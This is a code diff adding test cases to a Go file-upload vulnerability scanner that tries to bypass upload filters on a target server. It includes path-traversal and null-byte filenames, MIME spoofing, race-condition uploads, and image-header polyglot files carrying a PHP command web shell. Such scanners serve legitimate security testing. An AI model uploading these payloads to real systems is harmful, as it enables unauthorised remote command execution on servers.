@@ -788,6 +788,76 @@ func (s *FileUploadScanner) isUploadSuccessByKeywords(lowerBody string) bool {
 	return false
 }
 
+// testFrontendBypass 测试前端校验绕过
+func (s *FileUploadScanner) testFrontendBypass() {
+	utils.InfoPrint("正在测试前端校验绕过...")
+
+	// 测试直接上传恶意文件（模拟禁用JavaScript或修改前端代码）
+	phpContent := []byte("<?php phpinfo(); ?>")
+
+	// 测试各种恶意文件类型
+	frontendBypassTests := []struct {
+		name        string
+		fileName    string
+		contentType string
+		description string
+	}{
+		{
+			name:        "PHP文件直接上传",
+			fileName:    "shell.php",
+			contentType: "application/octet-stream",
+			description: "模拟禁用JavaScript或修改前端校验代码",
+		},
+		{
+			name:        "JSP文件直接上传",
+			fileName:    "shell.jsp",
+			contentType: "application/octet-stream",
+			description: "模拟前端校验被绕过",
+		},
+		{
+			name:        "ASP文件直接上传",
+			fileName:    "shell.asp",
+			contentType: "application/octet-stream",
+			description: "模拟前端校验失效",
+		},
+		{
+			name:        "ASPX文件直接上传",
+			fileName:    "shell.aspx",
+			contentType: "application/octet-stream",
+			description: "模拟前端校验被篡改",
+		},
+	}
+
+	for _, test := range frontendBypassTests {
+		resp, err := s.sendFileUploadRequest(test.fileName, test.contentType, phpContent)
+		if err != nil {
+			utils.ErrorPrint("发送请求失败: %v", err)
+			continue
+		}
+
+		result := FileUploadResult{
+			TestType:     "前端校验绕过",
+			Technique:    test.name,
+			FileName:     test.fileName,
+			StatusCode:   resp.StatusCode(),
+			ResponseSize: len(resp.Body()),
+			Url:          s.target,
+		}
+
+		// 验证文件是否真的上传成功
+		if s.verifyFileUpload(test.fileName, resp) {
+			result.Vulnerable = true
+			result.Message = fmt.Sprintf("文件上传成功，存在前端校验绕过漏洞 - %s", test.description)
+			utils.SuccessPrint("发现漏洞: %s", result.Message)
+		} else {
+			result.Vulnerable = false
+			result.Message = "文件上传失败，前端校验有效"
+		}
+
+		s.addResult(result)
+	}
+}
+
 // testFileTypeBypass 测试文件类型绕过
 func (s *FileUploadScanner) testFileTypeBypass() {
 	utils.InfoPrint("正在测试文件类型绕过...")
@@ -837,21 +907,61 @@ func (s *FileUploadScanner) testFileNameBypass() {
 
 	// 测试各种文件名绕过技术
 	bypassTechniques := []struct {
-		name     string
-		fileName string
-	}{{
-		name:     "空格绕过",
-		fileName: "test.php ",
-	}, {
-		name:     "点号绕过",
-		fileName: "test.php.",
-	}, {
-		name:     "双写绕过",
-		fileName: "test.pphphp",
-	}, {
-		name:     "大小写混合",
-		fileName: "test.Php",
-	}}
+		name        string
+		fileName    string
+		description string
+	}{
+		{
+			name:        "空格绕过",
+			fileName:    "test.php ",
+			description: "Windows系统会忽略文件名末尾的空格",
+		},
+		{
+			name:        "点号绕过",
+			fileName:    "test.php.",
+			description: "Windows系统会忽略文件名末尾的点号",
+		},
+		{
+			name:        "双写绕过",
+			fileName:    "test.pphphp",
+			description: "过滤php后剩余php",
+		},
+		{
+			name:        "大小写混合",
+			fileName:    "test.Php",
+			description: "大小写不敏感系统可能绕过",
+		},
+		{
+			name:        "下划线绕过",
+			fileName:    "test.php_",
+			description: "Windows系统会忽略文件名末尾的下划线",
+		},
+		{
+			name:        "分号绕过",
+			fileName:    "test.asp;.jpg",
+			description: "IIS 6.0解析漏洞，分号前为有效后缀",
+		},
+		{
+			name:        "冒号绕过",
+			fileName:    "test.php:.jpg",
+			description: "Windows NTFS数据流特性",
+		},
+		{
+			name:        "Unicode绕过",
+			fileName:    "test.p\u0068p",
+			description: "Unicode编码绕过",
+		},
+		{
+			name:        "URL编码绕过",
+			fileName:    "test.p%68p",
+			description: "URL编码绕过",
+		},
+		{
+			name:        "特殊字符绕过",
+			fileName:    "test.p<h1>hp",
+			description: "HTML标签绕过",
+		},
+	}
 
 	phpContent := []byte("<?php phpinfo(); ?>")
 
@@ -874,7 +984,7 @@ func (s *FileUploadScanner) testFileNameBypass() {
 		// 验证文件是否真的上传成功
 		if s.verifyFileUpload(tech.fileName, resp) {
 			result.Vulnerable = true
-			result.Message = "文件上传成功，存在文件名绕过漏洞"
+			result.Message = fmt.Sprintf("文件上传成功，存在文件名绕过漏洞 - %s", tech.description)
 			utils.SuccessPrint("发现漏洞: %s", result.Message)
 		} else {
 			result.Vulnerable = false
@@ -889,18 +999,93 @@ func (s *FileUploadScanner) testFileNameBypass() {
 func (s *FileUploadScanner) testPathTraversal() {
 	utils.InfoPrint("正在测试路径穿越...")
 
-	// 测试路径穿越Payload
-	pathPayloads := []string{
-		"../../../../var/www/html/test.php",
-		"../../../test.php",
-		"../test.php",
-		"../../../../test.php", // Windows风格（使用正斜杠兼容）
+	// 测试各种路径穿越技术
+	pathTraversalTests := []struct {
+		name        string
+		fileName    string
+		description string
+	}{
+		{
+			name:        "Linux路径穿越",
+			fileName:    "../../../../var/www/html/test.php",
+			description: "Linux系统路径穿越",
+		},
+		{
+			name:        "Windows路径穿越",
+			fileName:    "..\\..\\..\\..\\inetpub\\wwwroot\\test.php",
+			description: "Windows系统路径穿越",
+		},
+		{
+			name:        "混合路径穿越",
+			fileName:    "..\\../..\\../var/www/html/test.php",
+			description: "混合路径穿越",
+		},
+		{
+			name:        "绝对路径覆盖",
+			fileName:    "/var/www/html/test.php",
+			description: "绝对路径覆盖",
+		},
+		{
+			name:        "URL编码路径",
+			fileName:    "..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2ftest.php",
+			description: "URL编码路径穿越",
+		},
+		{
+			name:        "双重URL编码",
+			fileName:    "..%252f..%252f..%252f..%252fvar%252fwww%252fhtml%252ftest.php",
+			description: "双重URL编码路径穿越",
+		},
+		{
+			name:        "Unicode编码路径",
+			fileName:    "..\u002f..\u002f..\u002f..\u002fvar\u002fwww\u002fhtml\u002ftest.php",
+			description: "Unicode编码路径穿越",
+		},
+		{
+			name:        "空字节截断",
+			fileName:    "test.php%00.jpg",
+			description: "空字节截断路径",
+		},
+		{
+			name:        "URL空字节",
+			fileName:    "test.php%2500.jpg",
+			description: "URL编码空字节截断",
+		},
+		{
+			name:        "点号截断",
+			fileName:    "test.php.",
+			description: "点号截断路径",
+		},
+		{
+			name:        "空格截断",
+			fileName:    "test.php ",
+			description: "空格截断路径",
+		},
+		{
+			name:        "制表符截断",
+			fileName:    "test.php\t",
+			description: "制表符截断路径",
+		},
+		{
+			name:        "换行符截断",
+			fileName:    "test.php\n",
+			description: "换行符截断路径",
+		},
+		{
+			name:        "特殊字符截断",
+			fileName:    "test.php<>",
+			description: "特殊字符截断路径",
+		},
+		{
+			name:        "长文件名截断",
+			fileName:    "test" + strings.Repeat("a", 200) + ".php",
+			description: "长文件名截断路径",
+		},
 	}
 
 	phpContent := []byte("<?php phpinfo(); ?>")
 
-	for _, payload := range pathPayloads {
-		resp, err := s.sendFileUploadRequest(payload, "application/octet-stream", phpContent)
+	for _, test := range pathTraversalTests {
+		resp, err := s.sendFileUploadRequest(test.fileName, "application/octet-stream", phpContent)
 		if err != nil {
 			utils.ErrorPrint("发送请求失败: %v", err)
 			continue
@@ -908,17 +1093,17 @@ func (s *FileUploadScanner) testPathTraversal() {
 
 		result := FileUploadResult{
 			TestType:     "路径处理",
-			Technique:    "路径穿越",
-			FileName:     payload,
+			Technique:    test.name,
+			FileName:     test.fileName,
 			StatusCode:   resp.StatusCode(),
 			ResponseSize: len(resp.Body()),
 			Url:          s.target,
 		}
 
 		// 验证文件是否真的上传成功
-		if s.verifyFileUpload(payload, resp) {
+		if s.verifyFileUpload(test.fileName, resp) {
 			result.Vulnerable = true
-			result.Message = "文件上传成功，存在路径穿越漏洞"
+			result.Message = fmt.Sprintf("文件上传成功，存在路径穿越漏洞 - %s", test.description)
 			utils.SuccessPrint("发现漏洞: %s", result.Message)
 		} else {
 			result.Vulnerable = false
@@ -933,36 +1118,254 @@ func (s *FileUploadScanner) testPathTraversal() {
 func (s *FileUploadScanner) testContentBypass() {
 	utils.InfoPrint("正在测试内容校验绕过...")
 
-	// 测试Base64编码绕过
-	encodedPhp := base64.StdEncoding.EncodeToString([]byte("<?php phpinfo(); ?>"))
-	encodedContent := []byte(fmt.Sprintf("<!-- %s -->", encodedPhp))
-
-	resp, err := s.sendFileUploadRequest("test.txt", "text/plain", encodedContent)
-	if err != nil {
-		utils.ErrorPrint("发送请求失败: %v", err)
-		return
+	// 测试各种内容绕过技术
+	contentBypassTests := []struct {
+		name        string
+		fileName    string
+		content     []byte
+		contentType string
+		description string
+	}{
+		{
+			name:        "图片马-GIF",
+			fileName:    "webshell.gif",
+			content:     []byte("GIF89a<?php system($_GET['cmd']); ?>"),
+			contentType: "image/gif",
+			description: "GIF文件头+PHP代码",
+		},
+		{
+			name:        "图片马-JPEG",
+			fileName:    "webshell.jpg",
+			content:     []byte("\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>"),
+			contentType: "image/jpeg",
+			description: "JPEG文件头+PHP代码",
+		},
+		{
+			name:        "图片马-PNG",
+			fileName:    "webshell.png",
+			content:     []byte("\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>"),
+			contentType: "image/png",
+			description: "PNG文件头+PHP代码",
+		},
+		{
+			name:        "Base64编码",
+			fileName:    "test.txt",
+			content:     []byte(fmt.Sprintf("<!-- %s -->", base64.StdEncoding.EncodeToString([]byte("<?php phpinfo(); ?>")))),
+			contentType: "text/plain",
+			description: "Base64编码绕过",
+		},
+		{
+			name:        "HTML注释",
+			fileName:    "test.html",
+			content:     []byte("<!-- <?php phpinfo(); ?> -->"),
+			contentType: "text/html",
+			description: "HTML注释绕过",
+		},
+		{
+			name:        "XML标签",
+			fileName:    "test.xml",
+			content:     []byte("<?xml version=\"1.0\"?><?php phpinfo(); ?>"),
+			contentType: "application/xml",
+			description: "XML标签绕过",
+		},
+		{
+			name:        "JavaScript代码",
+			fileName:    "test.js",
+			content:     []byte("// <?php phpinfo(); ?>"),
+			contentType: "application/javascript",
+			description: "JavaScript注释绕过",
+		},
+		{
+			name:        "CSS样式",
+			fileName:    "test.css",
+			content:     []byte("/* <?php phpinfo(); ?> */"),
+			contentType: "text/css",
+			description: "CSS注释绕过",
+		},
+		{
+			name:        "UTF-8 BOM",
+			fileName:    "test.php",
+			content:     []byte("\xef\xbb\xbf<?php phpinfo(); ?>"),
+			contentType: "application/octet-stream",
+			description: "UTF-8 BOM绕过",
+		},
+		{
+			name:        "Unicode编码",
+			fileName:    "test.php",
+			content:     []byte("<?php \u0070\u0068\u0070\u0069\u006e\u0066\u006f(); ?>"),
+			contentType: "application/octet-stream",
+			description: "Unicode编码绕过",
+		},
+		{
+			name:        "URL编码",
+			fileName:    "test.php",
+			content:     []byte("<?php %70%68%70%69%6e%66%6f(); ?>"),
+			contentType: "application/octet-stream",
+			description: "URL编码绕过",
+		},
+		{
+			name:        "Hex编码",
+			fileName:    "test.php",
+			content:     []byte("<?php \x70\x68\x70\x69\x6e\x66\x6f(); ?>"),
+			contentType: "application/octet-stream",
+			description: "Hex编码绕过",
+		},
+		{
+			name:        "空格填充",
+			fileName:    "test.php",
+			content:     []byte("<?php     phpinfo    (    )    ;    ?>"),
+			contentType: "application/octet-stream",
+			description: "空格填充绕过",
+		},
+		{
+			name:        "换行符",
+			fileName:    "test.php",
+			content:     []byte("<?php\nphpinfo\n(\n)\n;\n?>"),
+			contentType: "application/octet-stream",
+			description: "换行符绕过",
+		},
+		{
+			name:        "制表符",
+			fileName:    "test.php",
+			content:     []byte("<?php\tphpinfo\t(\t)\t;\t?>"),
+			contentType: "application/octet-stream",
+			description: "制表符绕过",
+		},
 	}
 
-	result := FileUploadResult{
-		TestType:     "内容校验",
-		Technique:    "Base64编码绕过",
-		FileName:     "test.txt",
-		StatusCode:   resp.StatusCode(),
-		ResponseSize: len(resp.Body()),
-		Url:          s.target,
+	for _, test := range contentBypassTests {
+		resp, err := s.sendFileUploadRequest(test.fileName, test.contentType, test.content)
+		if err != nil {
+			utils.ErrorPrint("发送请求失败: %v", err)
+			continue
+		}
+
+		result := FileUploadResult{
+			TestType:     "内容校验",
+			Technique:    test.name,
+			FileName:     test.fileName,
+			StatusCode:   resp.StatusCode(),
+			ResponseSize: len(resp.Body()),
+			Url:          s.target,
+		}
+
+		// 验证文件是否真的上传成功
+		if s.verifyFileUpload(test.fileName, resp) {
+			result.Vulnerable = true
+			result.Message = fmt.Sprintf("文件上传成功，存在内容校验绕过漏洞 - %s", test.description)
+			utils.SuccessPrint("发现漏洞: %s", result.Message)
+		} else {
+			result.Vulnerable = false
+			result.Message = "文件上传失败，内容校验有效"
+		}
+
+		s.addResult(result)
+	}
+}
+
+// testMIMEBypass 测试MIME类型绕过
+func (s *FileUploadScanner) testMIMEBypass() {
+	utils.InfoPrint("正在测试MIME类型绕过...")
+
+	phpContent := []byte("<?php phpinfo(); ?>")
+
+	// 测试各种MIME类型绕过技术
+	mimeBypassTests := []struct {
+		name        string
+		fileName    string
+		contentType string
+		description string
+	}{
+		{
+			name:        "伪造图片MIME",
+			fileName:    "shell.php",
+			contentType: "image/jpeg",
+			description: "将PHP文件伪装成JPEG图片",
+		},
+		{
+			name:        "伪造GIF MIME",
+			fileName:    "shell.php",
+			contentType: "image/gif",
+			description: "将PHP文件伪装成GIF图片",
+		},
+		{
+			name:        "伪造PNG MIME",
+			fileName:    "shell.php",
+			contentType: "image/png",
+			description: "将PHP文件伪装成PNG图片",
+		},
+		{
+			name:        "伪造文本MIME",
+			fileName:    "shell.php",
+			contentType: "text/plain",
+			description: "将PHP文件伪装成纯文本",
+		},
+		{
+			name:        "伪造HTML MIME",
+			fileName:    "shell.php",
+			contentType: "text/html",
+			description: "将PHP文件伪装成HTML文件",
+		},
+		{
+			name:        "伪造XML MIME",
+			fileName:    "shell.php",
+			contentType: "application/xml",
+			description: "将PHP文件伪装成XML文件",
+		},
+		{
+			name:        "伪造JSON MIME",
+			fileName:    "shell.php",
+			contentType: "application/json",
+			description: "将PHP文件伪装成JSON文件",
+		},
+		{
+			name:        "伪造PDF MIME",
+			fileName:    "shell.php",
+			contentType: "application/pdf",
+			description: "将PHP文件伪装成PDF文件",
+		},
+		{
+			name:        "伪造Word MIME",
+			fileName:    "shell.php",
+			contentType: "application/msword",
+			description: "将PHP文件伪装成Word文档",
+		},
+		{
+			name:        "伪造Excel MIME",
+			fileName:    "shell.php",
+			contentType: "application/vnd.ms-excel",
+			description: "将PHP文件伪装成Excel文档",
+		},
 	}
 
-	// 验证文件是否真的上传成功
-	if s.verifyFileUpload("test.txt", resp) {
-		result.Vulnerable = true
-		result.Message = "文件上传成功，存在内容校验绕过漏洞"
-		utils.SuccessPrint("发现漏洞: %s", result.Message)
-	} else {
-		result.Vulnerable = false
-		result.Message = "文件上传失败，内容校验有效"
-	}
+	for _, test := range mimeBypassTests {
+		resp, err := s.sendFileUploadRequest(test.fileName, test.contentType, phpContent)
+		if err != nil {
+			utils.ErrorPrint("发送请求失败: %v", err)
+			continue
+		}
 
-	s.addResult(result)
+		result := FileUploadResult{
+			TestType:     "MIME类型检测",
+			Technique:    test.name,
+			FileName:     test.fileName,
+			StatusCode:   resp.StatusCode(),
+			ResponseSize: len(resp.Body()),
+			Url:          s.target,
+		}
+
+		// 验证文件是否真的上传成功
+		if s.verifyFileUpload(test.fileName, resp) {
+			result.Vulnerable = true
+			result.Message = fmt.Sprintf("文件上传成功，存在MIME类型绕过漏洞 - %s", test.description)
+			utils.SuccessPrint("发现漏洞: %s", result.Message)
+		} else {
+			result.Vulnerable = false
+			result.Message = "文件上传失败，MIME类型检测有效"
+		}
+
+		s.addResult(result)
+	}
 }
 
 // testDoubleExtension 测试双后缀绕过
@@ -1163,6 +1566,55 @@ func (s *FileUploadScanner) testDirectUpload() {
 	}
 
 	s.addResult(result)
+}
+
+// testRaceCondition 测试条件竞争
+func (s *FileUploadScanner) testRaceCondition() {
+	utils.InfoPrint("正在测试条件竞争...")
+
+	// 测试条件竞争漏洞
+	phpContent := []byte("<?php phpinfo(); ?>")
+
+	// 并发上传测试
+	var wg sync.WaitGroup
+	concurrentUploads := 10
+
+	for i := 0; i < concurrentUploads; i++ {
+		wg.Add(1)
+		go func(index int) {
+			defer wg.Done()
+
+			fileName := fmt.Sprintf("race_%d.php", index)
+			resp, err := s.sendFileUploadRequest(fileName, "application/octet-stream", phpContent)
+			if err != nil {
+				utils.ErrorPrint("并发上传失败: %v", err)
+				return
+			}
+
+			result := FileUploadResult{
+				TestType:     "条件竞争",
+				Technique:    "并发上传",
+				FileName:     fileName,
+				StatusCode:   resp.StatusCode(),
+				ResponseSize: len(resp.Body()),
+				Url:          s.target,
+			}
+
+			// 验证文件是否真的上传成功
+			if s.verifyFileUpload(fileName, resp) {
+				result.Vulnerable = true
+				result.Message = "文件上传成功，可能存在条件竞争漏洞"
+				utils.SuccessPrint("发现漏洞: %s", result.Message)
+			} else {
+				result.Vulnerable = false
+				result.Message = "文件上传失败，条件竞争检测有效"
+			}
+
+			s.addResult(result)
+		}(i)
+	}
+
+	wg.Wait()
 }
 
 func init() {
